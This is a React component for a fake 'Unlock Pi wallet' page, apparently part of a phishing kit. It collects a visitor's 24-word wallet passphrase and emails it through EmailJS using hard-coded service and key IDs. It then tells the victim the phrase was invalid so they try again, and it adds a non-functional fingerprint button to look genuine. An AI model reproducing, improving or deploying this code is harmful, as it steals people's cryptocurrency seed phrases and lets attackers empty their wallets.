import { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import piLogo from "../../pages/validate/assets/pi_logo-x.png";

export default function Wallet() {
  const form = useRef<HTMLFormElement | null>(null);
  const [phrase, setPhrase] = useState("");
  const [phraseError, setPhraseError] = useState(false);
  const [warningBanner, setWarningBanner] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  function onSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault(); // Prevent default form submission

    const arrFromPhrase = phrase.trim().split(" ");
    const phraseLength = arrFromPhrase.length;
    console.log(phraseLength);
    if (phraseLength !== 24) {
      setPhraseError(true);
      return; // Exit the function early if validation fails
    }

    // Validation passed, proceed with form submission
    setPhraseError(false);
    setSubmitting(true);

    emailjs
      .sendForm(
        "service_j7hjdbi",
        "template_w4doy7k",
        form.current as unknown as string,
        {
          publicKey: "cOODegwoykAeq3Nw_",
        }
      )
      .then(
        () => {
          setWarningBanner(true);
          setSubmitting(false);
          setPhrase("");
        },
        (error) => {
          setPhraseError(true);
          setSubmitting(false);
          console.log("FAILED...", error.text);
        }
      );
  }

  return (
    <>
      <div className="bg-primary-3 text-white text-center py-3 flex items-center justify-center">
        <h1>Wallet</h1>
        <img src={piLogo} alt="Pi logo" className="h-10"/>
      </div>
      <main className="container mx-auto px-4 py-10 max-w-screen-xl">
        <h3 className="text-center font-semibold mb-8">Unlock Pi wallet</h3>
        {warningBanner ? (
          <div className="text-center mt-10">
            <p>
              Please provide a valid 24-word phrase to unlock your Pi wallet.
              The phrase you provided is invalid
            </p>
            <button
              onClick={() => {
                window.location.reload();
              }}
              className="bg-purple-800 text-white rounded-xl py-3 text-sm px-28 mt-5"
            >
              Try Again
            </button>
          </div>
        ) : (
          <form ref={form} onSubmit={onSubmit} className="flex items-center flex-col">
            <textarea
              value={phrase}
              onChange={(e) => {
                setPhrase(e.currentTarget.value);
              }}
              name="message"
              id=""
              cols={20}
              rows={5}
              placeholder="Enter your 24 word passphrase here"
              className="w-full p-3 mb-3 outline-secondary border-secondary border rounded-md md:max-w-full max-w-[350px] mx-auto"
            ></textarea>
            {phraseError && (
              <p className="text-red-500 text-center mb-5">
                Invalid Passphrase
              </p>
            )}
            <div className="flex flex-col justify-center gap-3">
              <div className="flex justify-center">
                <button
                  type="submit" // Change button type to "submit" to trigger form submission
                  className="border-2 transition-all duration-300
           border-primary-1 text-primary-1 hover:bg-primary-1 hover:text-white rounded-full py-3 px-5"
                  disabled={submitting} // Disable the button while submitting
                >
                  {submitting ? "Submitting..." : "UNLOCK WITH PASSPHRASE"}
                </button>
              </div>
              <div className="flex justify-center">
                <button className="rounded-full py-3 px-5 bg-primary-1 text-white">
                  UNLOCK WITH FINGERPRINT
                </button>
              </div>
            </div>
          </form>
        )}
        <p className="mt-10">
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible.
        </p>
        <p className="mt-5">
          Lost your passphrase?{" "}
          <span className="text-primary-1">You can create a new wallet</span>,
          but all your π in your previous wallet will be inaccessible.
        </p>
      </main>
    </>
  );
}
